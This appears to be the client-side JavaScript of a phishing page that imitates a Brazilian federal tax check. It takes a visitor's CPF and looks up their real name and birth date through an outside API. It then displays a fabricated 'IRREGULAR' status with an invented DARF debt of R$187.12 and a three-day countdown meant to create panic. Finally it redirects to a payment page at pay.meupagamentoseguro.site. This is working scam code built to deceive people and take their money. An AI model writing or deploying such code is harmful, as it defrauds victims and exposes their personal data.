// Sistema de navegação entre telas
let currentScreen = 1;
let countdownInterval;

// Variáveis globais para dados da API
let userData = {
    nome: '',
    cpf: '',
    nascimento: '',
    situacao: 'IRREGULAR',
    declaracao: 'NÃO ENTREGUE',
    protocolo: 'CTPS485364',
    prazo: '', // Será calculado dinamicamente
    status: 'CRÍTICO',
    // Valores fixos do DARF
    valorPrincipal: 150.00,
    multa: 25.00,
    juros: 12.12,
    valorTotal: 187.12
};

// Função para calcular prazo de 3 dias a partir de hoje
function calcularPrazo() {
    const hoje = new Date();
    const prazo = new Date(hoje);
    prazo.setDate(hoje.getDate() + 3);
    
    return prazo.toLocaleDateString('pt-BR');
}

// Função para calcular contador regressivo de 3 dias
function calcularTempoRestante() {
    const hoje = new Date();
    const prazo = new Date(hoje);
    prazo.setDate(hoje.getDate() + 3);
    prazo.setHours(23, 59, 59, 999); // Final do dia
    
    const agora = new Date();
    const diferenca = prazo - agora;
    
    if (diferenca <= 0) {
        return { horas: 0, minutos: 0, segundos: 0 };
    }
    
    const horas = Math.floor(diferenca / (1000 * 60 * 60));
    const minutos = Math.floor((diferenca % (1000 * 60 * 60)) / (1000 * 60));
    const segundos = Math.floor((diferenca % (1000 * 60)) / 1000);
    
    return { horas, minutos, segundos };
}

// Função para consultar CPF na API real
async function consultarCPFReal(cpf) {
    const apiUrl = `https://encurtaapi.com/api/typebot?cpf=${cpf}`;
    
    // Limpar dados anteriores
    userData.nome = '';
    userData.cpf = cpf;
    userData.nascimento = '';
    userData.prazo = calcularPrazo(); // Calcular prazo de 3 dias
    
    try {
        console.log('Consultando API para CPF:', cpf);
        const response = await fetch(apiUrl);
        
        if (!response.ok) {
            throw new Error(`Erro na requisição: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('Resposta da API:', data);
        
        // Atualizar dados do usuário com informações reais da API
        userData.nome = data.NOME || 'Nome não disponível';
        userData.nascimento = data.NASCIMENTO || 'Data não disponível';
        
        // Garantir que a data esteja no formato dd/mm/yyyy
        if (userData.nascimento && /^\d{4}-\d{2}-\d{2}$/.test(userData.nascimento)) {
            userData.nascimento = new Date(userData.nascimento).toLocaleDateString('pt-BR');
        }
        
        console.log('Dados processados:', userData);
        return true;
    } catch (error) {
        console.error('Erro ao consultar CPF:', error);
        // Usar dados fictícios como fallback
        userData.nome = 'Carlos Henrique de Souza';
        userData.nascimento = '15/03/1985';
        return false;
    }
}

// Função para mostrar uma tela específica com animação suave
function showScreen(screenNumber) {
    const screens = document.querySelectorAll('.screen');
    const targetScreen = document.getElementById(`screen${screenNumber}`);
    
    if (!targetScreen) return;
    
    // Animar saída da tela atual
    screens.forEach(screen => {
        if (screen.classList.contains('active')) {
            screen.style.opacity = '0';
            screen.style.transform = 'translateY(-20px)';
            
            setTimeout(() => {
                screen.classList.remove('active');
                screen.style.opacity = '';
                screen.style.transform = '';
            }, 200);
        }
    });
    
    // Animar entrada da nova tela
    setTimeout(() => {
        targetScreen.classList.add('active');
        currentScreen = screenNumber;
        
        // Trigger para animações específicas da tela
        if (screenNumber === 2) {
            animateStatusLoading();
        } else if (screenNumber === 4 || screenNumber === 6) {
            animateProgress();
        }
    }, 250);
}

// Função para avançar para a próxima tela
async function proceedToScreen2() {
    console.log('proceedToScreen2 chamada!');
    
    const cpfInput = document.getElementById('cpf');
    const cpf = cpfInput.value.replace(/\D/g, '');
    
    console.log('CPF digitado:', cpf);
    
    if (cpf.length !== 11) {
        console.log('CPF inválido, mostrando erro');
        // Mostrar erro visual em vez de alert
        showError('Por favor, digite um CPF válido');
        return;
    }
    
    console.log('CPF válido, prosseguindo...');
    
    // Mostrar tela de carregamento
    showScreen(2);
    
    // Consultar CPF na API real
    try {
        const apiSuccess = await consultarCPFReal(cpf);
        
        if (apiSuccess) {
            console.log('Dados obtidos da API:', userData);
        } else {
            console.log('Usando dados fictícios como fallback');
        }
        
        // Atualizar dados na tela 3
        updateScreen3Data();
        
    } catch (error) {
        console.error('Erro na consulta:', error);
        // Continuar com dados fictícios
        updateScreen3Data();
    }
    
    // A animação de carregamento agora é controlada pela função animateStatusLoading()
}

// Função para atualizar dados na tela 3 com informações da API
function updateScreen3Data() {
    console.log('Atualizando dados da tela 3 com:', userData);
    
    // Atualizar nome do usuário em todos os elementos
    const userNameElements = document.querySelectorAll('.user-name');
    userNameElements.forEach(element => {
        if (userData.nome && userData.nome !== 'Nome não disponível') {
            element.textContent = userData.nome;
        }
    });
    
    // Atualizar inicial do avatar
    const avatarElement = document.querySelector('#screen3 .user-avatar');
    if (avatarElement && userData.nome && userData.nome !== 'Nome não disponível') {
        avatarElement.textContent = userData.nome.charAt(0).toUpperCase();
    }
    
    // Atualizar data de nascimento
    const birthDateElement = document.querySelector('#screen3 .birth-date');
    if (birthDateElement && userData.nascimento && userData.nascimento !== 'Data não disponível') {
        birthDateElement.textContent = userData.nascimento;
    }
    
    // Atualizar CPF
    const cpfElement = document.querySelector('#screen3 .cpf-number');
    if (cpfElement && userData.cpf) {
        cpfElement.textContent = userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }
    
    // Atualizar prazo
    const prazoElement = document.querySelector('#screen3 .due-date');
    if (prazoElement && userData.prazo) {
        prazoElement.textContent = userData.prazo;
    }
    
    // Atualizar dados do DARF na tela 5
    updateDarfData();
    
    console.log('Dados atualizados na tela 3:', userData);
}

function updateDarfData() {
    // Atualizar nome do contribuinte
    const contribuinteElement = document.querySelector('#screen5 .darf-value.user-name');
    if (contribuinteElement && userData.nome && userData.nome !== 'Nome não disponível') {
        contribuinteElement.textContent = userData.nome;
    }
    
    // Atualizar CPF
    const cpfDarfElement = document.querySelector('#screen5 .darf-value.cpf-number');
    if (cpfDarfElement && userData.cpf) {
        cpfDarfElement.textContent = userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }
    
    // Atualizar data de vencimento
    const vencimentoElement = document.querySelector('#screen5 .due-date');
    if (vencimentoElement && userData.prazo) {
        vencimentoElement.textContent = userData.prazo;
    }
    
    console.log('Dados do DARF atualizados:', userData);
}

// Função para mostrar erros de forma elegante
function showError(message) {
    const cpfInput = document.getElementById('cpf');
    const formGroup = cpfInput.closest('.form-group');
    
    // Criar elemento de erro se não existir
    let errorElement = formGroup.querySelector('.error-message');
    if (!errorElement) {
        errorElement = document.createElement('div');
        errorElement.className = 'error-message';
        errorElement.style.cssText = `
            color: var(--danger-red);
            font-size: 14px;
            margin-top: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideIn 0.3s ease;
        `;
        formGroup.appendChild(errorElement);
    }
    
    errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
    
    // Destacar campo com erro
    cpfInput.style.borderColor = 'var(--danger-red)';
    cpfInput.style.boxShadow = '0 0 0 3px rgba(229, 62, 62, 0.1)';
    
    // Remover erro após 3 segundos
    setTimeout(() => {
        errorElement.remove();
        cpfInput.style.borderColor = '';
        cpfInput.style.boxShadow = '';
    }, 3000);
}

function proceedToScreen4() {
    // Ir direto para a tela 5 (DARF) em vez da tela 4
    showScreen(5);
}

function proceedToScreen6() {
    showScreen(6);
    // A animação de progresso agora é controlada pela função animateProgress()
}

// Máscara para CPF
function formatCPF(input) {
    let value = input.value.replace(/\D/g, '');
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    input.value = value;
}

// Contador regressivo
function startCountdown() {
    // Limpar intervalo anterior se existir
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    const tempoRestante = calcularTempoRestante();
    
    let hours = tempoRestante.horas;
    let minutes = tempoRestante.minutos;
    let seconds = tempoRestante.segundos;
    
    // Atualizar elementos imediatamente
    const hoursEl = document.getElementById('hours');
    const minutesEl = document.getElementById('minutes');
    const secondsEl = document.getElementById('seconds');
    
    if (hoursEl) hoursEl.textContent = hours.toString().padStart(2, '0');
    if (minutesEl) minutesEl.textContent = minutes.toString().padStart(2, '0');
    if (secondsEl) secondsEl.textContent = seconds.toString().padStart(2, '0');
    
    countdownInterval = setInterval(() => {
        seconds--;
        
        if (seconds < 0) {
            seconds = 59;
            minutes--;
        }
        
        if (minutes < 0) {
            minutes = 59;
            hours--;
        }
        
        if (hours < 0) {
            hours = 0;
            minutes = 0;
            seconds = 0;
            clearInterval(countdownInterval);
        }
        
        // Atualizar elementos na tela
        if (hoursEl) hoursEl.textContent = hours.toString().padStart(2, '0');
        if (minutesEl) minutesEl.textContent = minutes.toString().padStart(2, '0');
        if (secondsEl) secondsEl.textContent = seconds.toString().padStart(2, '0');
    }, 1000);
}

// Animações de progresso mais realistas nas telas de carregamento
function animateProgress() {
    const progressSteps = document.querySelectorAll('.progress-step');
    const paymentSteps = document.querySelectorAll('.payment-step');
    
    // Animar progresso da tela 4
    if (currentScreen === 4) {
        // Etapa 1: Validando Pagamento
        setTimeout(() => {
            if (progressSteps[0]) {
                progressSteps[0].classList.add('completed');
                progressSteps[0].querySelector('i').className = 'fas fa-check';
            }
            if (paymentSteps[0]) {
                paymentSteps[0].classList.add('completed');
                paymentSteps[0].querySelector('i').className = 'fas fa-check';
            }
        }, 1000);
        
        // Etapa 2: Conectando com Banco
        setTimeout(() => {
            if (progressSteps[1]) {
                progressSteps[1].classList.add('completed');
                progressSteps[1].querySelector('i').className = 'fas fa-check';
            }
            if (paymentSteps[1]) {
                paymentSteps[1].classList.add('active');
            }
        }, 2500);
        
        // Etapa 3: Gerando Guia de Pagamento
        setTimeout(() => {
            if (progressSteps[2]) {
                progressSteps[2].classList.add('active');
            }
            if (paymentSteps[2]) {
                paymentSteps[2].classList.add('active');
            }
        }, 4000);
        
        // Avançar para próxima tela
        setTimeout(() => {
            showScreen(5);
        }, 5000);
    }
    
    // Animar progresso da tela 6
    if (currentScreen === 6) {
        // Todas as etapas já completadas, apenas ativar PIX
        setTimeout(() => {
            if (progressSteps[0]) {
                progressSteps[0].classList.add('completed');
                progressSteps[0].querySelector('i').className = 'fas fa-check';
            }
            if (paymentSteps[0]) {
                paymentSteps[0].classList.add('completed');
                paymentSteps[0].querySelector('i').className = 'fas fa-check';
            }
        }, 500);
        
        setTimeout(() => {
            if (progressSteps[1]) {
                progressSteps[1].classList.add('completed');
                progressSteps[1].querySelector('i').className = 'fas fa-check';
            }
            if (paymentSteps[1]) {
                paymentSteps[1].classList.add('completed');
                paymentSteps[1].querySelector('i').className = 'fas fa-check';
            }
        }, 1000);
        
        setTimeout(() => {
            if (progressSteps[2]) {
                progressSteps[2].classList.add('completed');
                progressSteps[2].querySelector('i').className = 'fas fa-check';
            }
            if (paymentSteps[2]) {
                paymentSteps[2].classList.add('active');
                paymentSteps[2].querySelector('i').className = 'fas fa-external-link-alt';
            }
        }, 1500);
        
        // Finalizar processo
        setTimeout(() => {
            showSuccessMessage();
        }, 3000);
    }
}

// Mostrar mensagem de redirecionamento para checkout
function showSuccessMessage() {
    const loadingContent = document.querySelector('#screen6 .card-body');
    if (loadingContent) {
        loadingContent.innerHTML = `
            <div style="text-align: center;">
                <div style="width: 80px; height: 80px; background: linear-gradient(135deg, #0066cc, #4ddb7f); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; animation: successPulse 2s ease-in-out infinite;">
                    <i class="fas fa-external-link-alt" style="color: white; font-size: 32px;"></i>
                </div>
                <h2 style="color: #0066cc; margin-bottom: 16px; font-size: 28px; font-weight: 600;">Redirecionando para Checkout</h2>
                <p style="color: #475569; font-size: 16px; line-height: 1.6;">Preparando dados do contribuinte:<br><strong>${userData.nome || 'Nome não disponível'}</strong><br>CPF: <strong>${userData.cpf ? userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : 'Não disponível'}</strong></p>
                <div style="margin-top: 20px;">
                    <div style="width: 40px; height: 40px; border: 4px solid #e2e8f0; border-top: 4px solid #0066cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                </div>
            </div>
        `;
    }
    
    // Redirecionar diretamente para o checkout
    setTimeout(() => {
        window.location.href = 'https://pay.meupagamentoseguro.site/521rZJz0NDwZeaX';
    }, 3000);
}

// Simular carregamento de status na tela 2 com animações realistas
function animateStatusLoading() {
    const statusItems = document.querySelectorAll('.status-item');
    
    let currentIndex = 0;
    
    // Animar cada item sequencialmente
    function animateNextItem() {
        if (currentIndex < statusItems.length) {
            // Ativar item atual
            statusItems[currentIndex].classList.add('active');
            
            // Simular tempo de processamento realista
            const processingTime = 800 + Math.random() * 1200; // 800-2000ms
            
            setTimeout(() => {
                currentIndex++;
                animateNextItem();
            }, processingTime);
        } else {
            // Todos os itens processados, avançar para próxima tela
            setTimeout(() => {
                showScreen(3);
                startCountdown();
            }, 1000);
        }
    }
    
    // Iniciar animação após um pequeno delay
    setTimeout(animateNextItem, 500);
}

// Inicialização quando a página carrega
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM carregado! JavaScript funcionando!');
    
    // Adicionar máscara ao campo CPF
    const cpfInput = document.getElementById('cpf');
    if (cpfInput) {
        console.log('Campo CPF encontrado!');
        cpfInput.addEventListener('input', function() {
            formatCPF(this);
        });
    } else {
        console.error('Campo CPF não encontrado!');
    }
    
    // Adicionar evento de Enter no campo CPF
    if (cpfInput) {
        cpfInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                console.log('Enter pressionado!');
                proceedToScreen2();
            }
        });
    }
    
    // Mostrar tela inicial (login)
    showScreen(1);
    
    // Configurar observador para animações
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                const target = mutation.target;
                if (target.classList.contains('active')) {
                    if (currentScreen === 2) {
                        animateStatusLoading();
                    } else if (currentScreen === 4 || currentScreen === 6) {
                        animateProgress();
                    }
                }
            }
        });
    });
    
    // Observar mudanças nas telas
    const screens = document.querySelectorAll('.screen');
    screens.forEach(screen => {
        observer.observe(screen, { attributes: true });
    });
});
